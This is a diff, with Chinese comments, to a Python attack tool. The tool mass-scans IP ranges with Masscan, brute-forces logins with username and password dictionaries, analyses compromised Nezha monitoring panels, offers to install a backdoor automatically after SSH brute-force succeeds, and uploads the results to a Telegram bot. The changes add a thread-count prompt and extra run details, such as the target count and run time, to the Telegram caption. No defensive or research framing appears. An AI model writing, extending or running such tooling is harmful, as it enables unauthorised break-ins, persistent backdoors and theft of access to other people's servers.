@@ -1562,12 +1562,14 @@ if __name__ == "__main__":
     else:
         print("Usage: python ipcx.py <input_file> <output_file>")
 """
+
 def generate_ipcx_py():
     """
     将存储在 IPCX_PY_CONTENT 变量中的内容写入到 ipcx.py 文件中。
     """
     with open('ipcx.py', 'w', encoding='utf-8') as f:
         f.write(IPCX_PY_CONTENT)
+
 # =========================== 新增哪吒面板分析函数 ===========================
 def debug_log(message, level="INFO"):
     colors = {
@@ -2271,11 +2273,6 @@ def load_credentials(template_mode, auth_mode=0):
     if auth_mode == 1: # 无凭据
         return [], [], []
     
-    # ==================== FIX START ====================
-    # 使用 'utf-8-sig' 编码来读取所有字典文件。
-    # 这会自动处理并移除文件开头的BOM，防止BOM污染数据。
-    # 这是解决 "invalid BOM in the middle of the file" 错误的根本方法。
-    
     if auth_mode == 2: # 用户/密码文件
         if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
             print("❌ 错误: 缺少 username.txt 或 password.txt 文件。")
@@ -2299,8 +2296,6 @@ def load_credentials(template_mode, auth_mode=0):
             print("❌ 错误: credentials.txt 文件为空或格式不正确。")
             sys.exit(1)
         return usernames, passwords, credentials
-
-    # ===================== FIX END =====================
 
     # 非代理模式的默认逻辑
     use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
@@ -2485,6 +2480,7 @@ if __name__ == "__main__":
     start = time.time()
     interrupted = False
     final_result_file = None
+    total_ips = 0 # 初始化 total_ips
     
     TEMP_PART_DIR = "temp_parts"
     TEMP_XUI_DIR = "xui_outputs"
@@ -2528,6 +2524,12 @@ if __name__ == "__main__":
         params['timeout'] = input_with_default("超时时间(秒)", 3)
         masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
         
+        # ==================== 新增修改：提前询问哪吒分析线程数 ====================
+        nezha_analysis_threads = 0
+        if TEMPLATE_MODE == 2:
+            nezha_analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)
+        # =================================================================
+
         AUTH_MODE = 0
         if TEMPLATE_MODE == 6: # SSH 模式
             choice = input("是否在SSH爆破成功后自动安装后门？(y/N)：").strip().lower()
@@ -2620,8 +2622,10 @@ if __name__ == "__main__":
             run_ipcx(final_txt_file, final_xlsx_file)
 
         if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
-            analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)
+            # ==================== 修改：使用预设的线程数 ====================
+            analysis_threads = nezha_analysis_threads
             print(f"\n--- 开始对成功的哪吒面板进行深度分析（使用 {analysis_threads} 线程）... ---")
+            # =============================================================
             with open(final_txt_file, 'r', encoding='utf-8') as f:
                 results = [line.strip() for line in f if line.strip()]
             
@@ -2668,21 +2672,30 @@ if __name__ == "__main__":
             
             vps_ip, vps_country = get_vps_info()
             nezha_server = get_nezha_server()
-
+            
+            # ==================== 修改：格式化运行时间 ====================
+            run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
             if interrupted:
-                    print(f"\\n=== 脚本已被中断，中止前共运行 {cost // 60} 分 {cost % 60} 秒 ===")
+                    print(f"\n=== 脚本已被中断，中止前共运行 {run_time_str} ===")
             else:
-                    print(f"\\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")
+                    print(f"\n=== 全部完成！总用时 {run_time_str} ===")
+            # ============================================================
 
-            def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A"):
+            # ==================== 修改：Telegram 发送函数及调用 ====================
+            def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A", total_ips=0, run_time_str="N/A"):
                     if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                             print(f"⚠️ Telegram 上传跳过：文件 {file_path} 不存在或为空")
                             return
 
                     url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-                    caption_text = f"VPS: {vps_ip} ({vps_country})\\n"
+                    # 修正换行符并添加新信息
+                    caption_text = (
+                        f"VPS: {vps_ip} ({vps_country})\n"
+                        f"总目标数: {total_ips}\n"
+                        f"总用时: {run_time_str}\n"
+                    )
                     if nezha_server != "N/A":
-                        caption_text += f"哪吒Server: {nezha_server}\\n"
+                        caption_text += f"哪吒Server: {nezha_server}\n"
                     caption_text += f"任务结果: {os.path.basename(file_path)}"
                     
                     with open(file_path, "rb") as f:
@@ -2715,5 +2728,6 @@ if __name__ == "__main__":
                     if os.path.exists(fail_file): files_to_send.append(fail_file)
 
                 for f in files_to_send:
-                    print(f"\\n📤 正在将 {f} 上传至 Telegram ...")
-                    send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server)
+                    print(f"\n📤 正在将 {f} 上传至 Telegram ...")
+                    # 传递新增的参数
+                    send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server, total_ips, run_time_str)
